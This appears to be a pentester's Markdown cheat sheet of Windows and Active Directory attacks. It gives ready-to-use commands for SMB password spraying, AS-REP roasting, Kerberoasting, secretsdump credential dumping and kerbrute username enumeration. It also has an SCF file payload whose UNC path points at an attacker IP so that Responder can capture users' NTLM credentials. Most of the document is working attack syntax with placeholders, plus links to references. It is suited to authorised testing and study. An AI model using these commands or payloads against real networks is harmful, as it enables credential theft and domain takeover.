## Miscellaneous Attacks In No Particular Order

**SMB Password Spraying**

When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial.

```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
# Authenticate with an NT hash
crackmapexec smb <IP> -u <USERLIST>-H '<NT_HASH>' --continue-on-success 
```

## Windows / Active Directory Attacks

**AS-REP Roasting**

AS-REP roasting is a technique that allows retrieving password hashes for users that have don't require Kerberos preauthentication. ``impacket`` has a utility that makes this trivial for us. I could only do a bad job explaining this attack, so I've linked much better resources below. It is important to note that this is not found often, if at all, in real world engagements.

```bash
python3 GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile <USERLIST>
```

- [Roasting AS-REPS](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

**Kerberoasting**

Kerberoasting is a method for extracting service account credentials from Active Directory as a notmal user. Again, [AD Security](https://adsecurity.org/) has an insane amount of content that goes in depth to what this is, how it works, and when to use it. I won't even bother going into the detail's of the attack here, but articles from them are linked below.

``impacket`` has a utility that makes this trivial for us, ``GetUserSPNs.py``.


```bash
# Normal Authentication
python3 GetUserSPNs.py -request -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -save -outputfile hashes.txt

# Authentication with NT and LM Hashes
python3 GetUserSPNs.py -request -dc-ip <IP> -hashes <LM_HASH>:<NT_HASH> <DOMAIN>/<USER> -save -outputfile hashes.txt
```

- [Cracking Kerberos TGS Tickets Using Kerberoast](https://adsecurity.org/?p=2293)
- [Dectecting Kerboasting Activity](https://adsecurity.org/?p=3458)
- [Kerberos Overview](https://adsecurity.org/?p=227)

**SCF File Attack**

An SCF *(Shell Command File)* can be used to access an attacker's UNC path. Planted inside a nwtwork share, when a user opens the ``scf`` file, Windows automatically authenicates to the server the UNC is pointing to, using the current user's credentials. We can use ``responder`` or somthing similar to harvest these credentials and crack them offline.

1) Inside a ``.scf`` file put:

```
[Shell]
Command=2
IconFile=\\<YOUR IP>\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

2) Run [responder](https://github.com/lgandx/Responder) locally

```bash
responder -I <NETWORK INTERFACE>
```

3) Put your ``.scf`` file on a share and wait for a user to open it.

- [SMB Share – SCF File Attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
- [Stealing Windows Credentials Using Google Chrome](https://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)

**Secrets/Credentials Dumping**

The impacket script ``secretsdump.py`` can be used to extract credentials and secrets from a system. There are 2 main use cases:
- Dump NTLM hash of local users (remote SAM dump)
- Extract Domain Credentials via *DC Sync*

There is a lot that can be explained on *how* this works, and  *where* this works; but this is mainly so I can remember tool syntax so I won't bother with going into those details.

```bash
python3 secretsdump.py <DOMAIN>/<USER>:<PASS>@<IP> -outputfile secretsdump
```

- [DC Sync Attacks With Secretsdump](https://www.youtube.com/watch?v=QfyZQDyeXjQ)
- [Secretsdump Demystified](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)

**Username Enumeration**

Enumerate valid usernames using ``kerbrute``. This requires Kerberos to the open.

```bash
kerbrute userenum -d <DOMAIN> --dc <IP> <USERLIST>
```
